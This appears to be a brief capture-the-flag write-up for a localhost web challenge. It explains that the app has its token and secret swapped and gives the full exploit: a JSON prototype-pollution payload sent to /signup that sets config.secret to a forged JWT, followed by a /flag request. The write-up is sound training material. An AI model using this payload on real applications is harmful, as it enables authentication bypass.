Notice that the token and secret have been mixed up.
This effectively means that you control the secret, however cannot control the token which is supposedly `nanoid(16)` at first glance.

Notice that you can perform prototype pollution and control `config.secret`, which replaces `nanoid(16)`.

1. Forge JWT token (with arbitrary secret) to pollute into config.secret
2. Set secret(token parameter as they have been intentionally mixed up) to the same secret used just now
3. profit

http://localhost:8080/signup
```json
{
    "user": "{\"__proto__\": {\"secret\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.orVYmmSMjSfa_rLPqA086kYRj02obCWPsrnlZzTTUmE\"}}"
}
```

http://localhost:8080/flag
```json
{
    "token": "bruh"
}
```
